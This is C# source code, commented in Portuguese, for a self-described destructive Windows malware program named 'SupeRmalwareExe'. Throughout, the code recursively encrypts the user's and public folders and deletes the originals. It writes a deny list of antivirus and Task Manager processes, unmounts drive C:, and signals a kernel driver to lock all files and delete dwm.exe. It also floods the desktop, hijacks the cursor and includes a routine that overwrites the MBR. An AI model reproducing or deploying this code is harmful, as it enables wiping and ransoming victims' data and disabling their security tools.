/*

    Projeto da "diversão"
    O programa vai se divertir um pouco, e depois, matar o PC

*/


using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SupeRmalwareExe
{
    public partial class Form1 : Form
    {
        /// <summary>
        /// Funções de criptografia aqui
        /// </summary>
        private class CriptografiaClasse
        {
            /// <summary>
            /// Criptografa um arquivo
            /// </summary>
            /// <param name="file"></param>
            /// <param name="outputFile"></param>
            public static void CriptografarArquivo(string arquivo, string arquivoNovo)
            {
                // UnicodeEncoding
                UnicodeEncoding UE = new UnicodeEncoding();

                // Obtenha os bytes
                byte[] key = UE.GetBytes("dimas123");

                // Novo FileStream para o outputFile
                FileStream outputCrypt = new FileStream(
                    // Arquivo
                    arquivoNovo,

                    // Crie o arquivo
                    FileMode.Create
                );

                // Novo RijndaelManaged, usado pra criptografar
                RijndaelManaged Rijndael = new RijndaelManaged();

                // Novo CryptoStream
                CryptoStream cs = new CryptoStream(
                    // Arquivo onde salvar
                    outputCrypt,

                    // Crie uma criptografia
                    Rijndael.CreateEncryptor(key, key),

                    // Escreva
                    CryptoStreamMode.Write
                );

                // Novo FileStream
                FileStream stream = new FileStream(arquivo, FileMode.Open);

                // Data
                int data;

                // Leia todos os bytes do arquivo
                while ((data = stream.ReadByte()) != -1)
                {
                    // Escreva os bytes no arquivo outputFile
                    cs.WriteByte((byte)data);
                }

                // Feche o arquivo original
                stream.Close();

                // Feche o outputFile
                cs.Close();

                // Feche o outputCrypt
                outputCrypt.Close();

                // Delete o arquivo anterior
                File.Delete(arquivo);
            }

            /// <summary>
            /// Criptografa arquivos dentro da pasta
            /// </summary>
            /// <param name="pasta"></param>
            /// <param name="arquivo"></param>
            /// <param name="verificacao"></param>
            /// <returns></returns>
            public static async Task CriptografarPastas(DirectoryInfo pasta, string arquivo)
            {
                // Intervalo
                await Task.Delay(1);

                try
                {
                    // Procure as pastas
                    foreach (DirectoryInfo subPasta in pasta.GetDirectories())
                    {
                        try
                        {
                            // Procure por outras pastas
                            await CriptografarPastas(subPasta, arquivo);
                        } catch (Exception) { }
                    }
                }
                catch (Exception) { }

                try
                {
                    // Procura todos os arquivos
                    foreach (FileInfo arquivosInf in pasta.GetFiles())
                    {
                        try
                        {
                            // Criptografe esse arquivo
                            CriptografarArquivo(arquivosInf.FullName, arquivosInf.FullName + ".enc");
                        } catch (Exception) { }
                    }
                }
                catch (Exception) { }
            }
        }

        /// <summary>
        /// Lista de executáveis dos antivírus
        /// </summary>
        static string[] antivirusArquivos =
        {
            // Kaspersky
            "AVP.EXE",
            "AVPUI.EXE",

            // Avast
            "AVASTUI.EXE",
            "AVASTSVC.EXE",
            "AFWSERV.EXE",
            "INSTUP.EXE",

            // Windows Defender
            "MSMPENG.EXE",

            // Malwarebytes
            "MBAMSERVICE.EXE",
            "MBAM.EXE",

            // Gerenciador de tarefas
            "TASKMGR.EXE",
            "TASKKILL.EXE",
            "REGEDIT.EXE",
            "PROCESSHACKER.EXE",

            // Processos importantes do Windows
            "WINIT.EXE",
            "WINLOGON.EXE",
            "SFC.EXE",
            "DWM.EXE"
        };

        /// <summary>
        /// Importação da DLL para alterar o wallpaper
        /// </summary>
        /// <param name="action"></param>
        /// <param name="uParam"></param>
        /// <param name="vParam"></param>
        /// <param name="winIni"></param>
        /// <returns></returns>
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        /// <summary>
        /// Valores
        /// </summary>
        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        /// <summary>
        /// Inicia um processo em segundo plano
        /// </summary>
        /// <param name="arquivo"></param>
        /// <param name="argumentos"></param>
        /// <returns></returns>
        private static async Task IniciarProcesso(string arquivo, string argumentos)
        {
            // Só para remover o "aviso" do Visual Studio XD
            await Task.Delay(1);

            // Novo processo
            Process processo = new System.Diagnostics.Process();

            // Nome do executável
            processo.StartInfo.FileName = arquivo;

            // Os argumentos que vão iniciar junto com o processo
            processo.StartInfo.Arguments = argumentos;

            // Não crie uma janela
            processo.StartInfo.CreateNoWindow = true;

            // Não use Shell ao executar o arquivo
            processo.StartInfo.UseShellExecute = false;

            // Inicie o arquivo como administrador
            processo.StartInfo.Verb = "runas";

            // Inicie o processo escondido, em segundo plano
            processo.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            // Inicie o processo
            processo.Start();

            // Espere o programa terminar
            processo.WaitForExit();
        }

        /// <summary>
        /// Altera o wallpaper
        /// </summary>
        /// <param name="path"></param>
        private void AlterarWallpaper(string local)
        {

            // Panel Desktop
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);

            // Valores
            key.SetValue(@"WallpaperStyle", 0.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());

            // Altere o wallpaper
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, local, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        /// <summary>
        /// Funções de kernel estarão aqui
        /// </summary>
        private class Kernel
        {
            [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern int CreateFile(
                String lpFileName,
                int dwDesiredAccess,
                int dwShareMode,
                IntPtr lpSecurityAttributes,
                int dwCreationDisposition,
                int dwFlagsAndAttributes,
                int hTemplateFile
            );

            [DllImport("kernel32", SetLastError = true)]
            public static extern bool CloseHandle(
                IntPtr handle
            );

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern int DeviceIoControl(
                IntPtr hDevice,
                uint dwIoControlCode,
                StringBuilder lpInBuffer,
                int nInBufferSize,
                StringBuilder lpOutBuffer,
                Int32 nOutBufferSize,
                ref Int32 lpBytesReturned,
                IntPtr lpOverlapped
            );

            [DllImport("kernel32")]
            public static extern bool WriteFile(
                IntPtr hFile,
                byte[] lpBuffer,
                uint nNumberOfBytesToWrite,
                out uint lpNumberOfBytesWritten,
                IntPtr lpOverlapped
            );

            public static uint FILE_DEVICE_UNKNOWN = 0x00000022;
            public static uint FILE_ANY_ACCESS = 0;
            public static uint METHOD_BUFFERED = 0;
            public static int GENERIC_WRITE = 0x40000000;
            public static int GENERIC_READ = unchecked((int)0x80000000);
            public static int GENERIC_ALL = 0x10000000;
            public static int FILE_SHARE_READ = 1;
            public static int FILE_SHARE_WRITE = 2;
            public static int OPEN_EXISTING = 3;
            public static int IOCTL_DISK_GET_DRIVE_LAYOUT_EX = unchecked((int)0x00070050);
            public static int ERROR_INSUFFICIENT_BUFFER = 122;

            /// <summary>
            /// CTL_CODE, para que o driver conheça nossa necessidade
            /// </summary>
            /// <param name="DeviceType"></param>
            /// <param name="Function"></param>
            /// <param name="Method"></param>
            /// <param name="Access"></param>
            /// <returns></returns>
            private static uint CTL_CODE(uint DeviceType, uint Function, uint Method, uint Access)
            {
                return ((DeviceType << 16) | (Access << 14) | (Function << 2) | Method);
            }

            /// <summary>
            /// Todos os códigos CTL
            /// </summary>
            public static class CTL_CODES
            {
                // Avisa para o driver que queremos bloquear todas as operações de arquivos
                public static uint BLOQUEAR_TUDO = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1000, METHOD_BUFFERED, FILE_ANY_ACCESS);

                // Avisa para o driver que queremos deletar um arquivo
                public static uint DELETAR_ARQUIVO = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2000, METHOD_BUFFERED, FILE_ANY_ACCESS);
            }

            /// <summary>
            /// Envia uma mensagem ao nosso driver
            /// </summary>
            /// <param name="mensagem"></param>
            /// <param name="Codigo"></param>
            public static bool EnviarMensagem(string mensagem, uint Ctl)
            {
                bool StatusRetornar = false;

                try
                {
                    // Nosso dispositivo de comunicação com o driver
                    IntPtr dispositivo = (IntPtr)CreateFile(
                        "\\\\.\\SupeRmalware",
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ,
                        IntPtr.Zero,
                        OPEN_EXISTING,
                        0,
                        0
                    );

                    // Novos bytes
                    int uCnt = 10;

                    // Mensagem para o kernel
                    StringBuilder enviarAoKernel = new StringBuilder(mensagem);

                    // Mensagem para receber do kernel
                    StringBuilder receberDoKernel = new StringBuilder();

                    // Envie a mensagem
                    DeviceIoControl(

                        // Dispositivo
                        dispositivo,

                        // Nosso código CTL
                        Ctl,

                        // Mensagem para enviar
                        enviarAoKernel,

                        // + 5, para não enviar lixo ao kernel
                        enviarAoKernel.Length + 5,

                        // Receber o kernel
                        receberDoKernel,
                        1,
                        ref uCnt,
                        IntPtr.Zero
                    );

                    // Se for um sucesso
                    if (receberDoKernel.ToString() == "success!")
                    {
                        // Sucesso
                        StatusRetornar = true;
                    }

                    // Feche o dispositivo
                    CloseHandle(dispositivo);
                } catch (Exception) { }

                // Status
                return StatusRetornar;
            }
        }

        /// <summary>
        /// Inicia tudo
        /// </summary>
        public Form1()
        {
            /*
            
                Método de preocausão para não infectar meu PC real XD

            */
            if (Directory.Exists("C:\\aa"))
            {
                Environment.Exit(0);
            }

            try
            {
                File.Create("C:\\Windows\\hahahalol").Close();
            } catch (Exception) { }

            // Crie um arquivo, e apague tudo nele
            File.WriteAllText("C:\\Windows\\System32\\deny.txt", "");

            // Veja a string de todos os antivírus
            foreach (string av in antivirusArquivos)
            {
                // Adicione o AV na lista
                File.AppendAllText("C:\\Windows\\System32\\deny.txt", av + Environment.NewLine);
            }

            // Delete o arquivo importante do Windows
            //Kernel.EnviarMensagem("\\Device\\HarddiskVolume1\\bootmgr", Kernel.CTL_CODES.DELETAR_ARQUIVO);

            //CorromperMBR();
            InitializeComponent();

            // Salve o wallpaper nesse local
            Properties.Resources.wallpaper.Save("C:\\Windows\\wallpaper.jpg");

            // Altere o wallpaper
            AlterarWallpaper("C:\\Windows\\wallpaper.jpg");

            // Nova thread, que vai executar a criptografia dos arquivos
            new Thread(() =>
            {
                Criptografar();
            }).Start();

            // Nova thread, vai lotar a área de trabalho
            new Thread(() =>
            {
                LotarArquivos();
            }).Start();

            // Nova thread, ela vai ficar ativando o audio de erro
            new Thread(() =>
            {
                SomDeErro();
            }).Start();

            // Nova thread, vai bugar o cursor
            new Thread(() =>
            {
                BugarCursor();
            }).Start();

            // Nova thread, vai fazer bloquear todos os arquivos
            new Thread(() =>
            {
                BloquearTudo();
            }).Start();

            // Nova thread, vai deletar o DWM
            new Thread(() =>
            {
                DeletarDWM();
            }).Start();
        }

        /// <summary>
        /// Função que vai criptografar os arquivos
        /// </summary>
        private void Criptografar()
        {
            // Pasta dos usuário
            DirectoryInfo usuario = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

            // Pasta pública
            DirectoryInfo publico = new DirectoryInfo("C:\\Users\\Public");

            // Novo thread
            new Thread(async () =>
            {
                // Criptografe essa pasta
                await CriptografiaClasse.CriptografarPastas(usuario, null);
            }).Start();

            new Thread(async () =>
            {
                await CriptografiaClasse.CriptografarPastas(publico, null);
            }).Start();
        }

        /// <summary>
        /// Cria um monte de arquivos na Desktop
        /// </summary>
        private void LotarArquivos()
        {
            // Pasta da área de trabalho
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            // Faça um loop até 250
            for (int i = 0; i < 250; i++)
            {
                try
                {
                    // Novo random
                    Random rd = new Random();

                    // Resultado
                    int resultado = rd.Next(0, 999) * i;
                    string arquivo = resultado.ToString();

                    // Crie o arquivo
                    File.Create(desktop + "\\" + arquivo).Close();
                } catch (Exception) { }
            }
        }

        // Loop de mensagens
        bool loopMensagem = true;

        /// <summary>
        /// Fica repetindo o audio de erro
        /// </summary>
        private async void SomDeErro()
        {
            // 20 Segundos
            await Task.Delay(20000);

            // Repetição infinita
            while (true)
            {
                // 1 Segundo
                await Task.Delay(500);

                if (loopMensagem == false)
                    break;

                try
                {
                    // Nova thread
                    new Thread(() =>
                    {
                        MessageBox.Show("Seu PC vai morrer!", "Adeus!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }).Start();
                } catch (Exception) { }
            }
        }

        /// <summary>
        /// Classe do Cursor
        /// </summary>
        private class CursorClasse
        {
            /// <summary>
            ///  Importação da DLL
            /// </summary>
            /// <param name="x"></param>
            /// <param name="y"></param>
            /// <returns></returns>
            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool SetCursorPos(int X, int Y);
        }

        /// <summary>
        /// Buga o mouse
        /// </summary>
        private async void BugarCursor()
        {
            await Task.Delay(10000);

            // Repetição infinita
            while (true)
            {
                await Task.Delay(100);

                // Local onde ficará o cursor
                CursorClasse.SetCursorPos(25, 25);
            }
        }

        /// <summary>
        /// Bloqueia todos os arquivos com o kernel
        /// </summary>
        private async void BloquearTudo()
        {
            // 2 minutos
            await Task.Delay(120000);

            // Pare o som
            loopMensagem = false;

            Jumpscare jmp = new Jumpscare();
            jmp.ShowDialog();

            // Desmonte o C:
            await IniciarProcesso("mountvol.exe", "C:\\ /d");

            // Se conseguir bloquear tudo
            if (Kernel.EnviarMensagem("Mensagem qualquer", Kernel.CTL_CODES.BLOQUEAR_TUDO))
            {
                MessageBox.Show("Seu Windows foi bloqueado! Aproveite o que der ;)", "O vírus informa:", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        /// <summary>
        /// Deleta um arquivo importante do Windows, que é o DWM.EXE
        /// Que faz com que as janelas fiquem bonitas
        /// </summary>
        private async void DeletarDWM()
        {
            // 1 Minuto
            await Task.Delay(60000);

            // Diga ao kernel para deletar esse arquivo
            Kernel.EnviarMensagem("\\??\\C:\\Windows\\System32\\dwm.exe", Kernel.CTL_CODES.DELETAR_ARQUIVO);

            await Task.Delay(2000);

            /*
             * 
             * Esse código foi removido, porque funciona somente no Windows 7 e 8
             * Eu testei no Wi11, e o PC travou
             * 
            try
            {
                // Procure todos os processo com o nome dwm
                foreach (Process processo in Process.GetProcessesByName("dwm"))
                {
                    // Mate-os
                    processo.Kill();
                }
            } catch (Exception) { }
            */
        }

        /// <summary>
        /// Corrompe a MBR do PC
        /// </summary>
        private void CorromperMBR()
        {
            // Data da MBR
            uint MbrSize = 512u;
            byte[] mbrData = new byte[MbrSize];

            // A MBR
            IntPtr mbr = (IntPtr)Kernel.CreateFile(
                "\\\\.\\PhysicalDrive0",
                Kernel.GENERIC_ALL,
                Kernel.FILE_SHARE_READ | Kernel.FILE_SHARE_WRITE,
                IntPtr.Zero,
                Kernel.OPEN_EXISTING,
                0,
                0
            );

            // Escreva na MBR, apagando ela de vez
            Kernel.WriteFile(
                mbr,
                mbrData,
                MbrSize,
                out uint lpNumberOfBytesWritten,
                IntPtr.Zero
            );

            // Feche a alça
            Kernel.CloseHandle(mbr);
        }

        /// <summary>
        /// Quando a FORM estiver fechando
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
